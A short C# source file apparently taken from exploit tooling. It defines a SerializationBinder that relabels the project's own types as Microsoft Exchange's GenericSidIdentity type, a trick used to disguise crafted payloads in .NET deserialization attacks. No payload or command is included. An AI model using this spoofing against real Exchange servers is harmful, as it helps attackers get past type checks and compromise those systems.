using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.Serialization;

namespace ConsoleApp1
{
    public class Class2 : SerializationBinder
    {
        public override Type BindToType(string assemblyName, string typeName)
        {
            throw new NotImplementedException();
        }

        public override void BindToName(Type serializedType, out string assemblyName, out string typeName)
        {
            if (serializedType.FullName.Contains("ConsoleApp1"))
            {
                assemblyName = "Microsoft.Exchange.Net, Version=15.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35";
                typeName = "Microsoft.Exchange.Security.Authentication.GenericSidIdentity";
            }
            else 
            {
                base.BindToName(serializedType, out assemblyName, out typeName);
            }
        }
    }
}
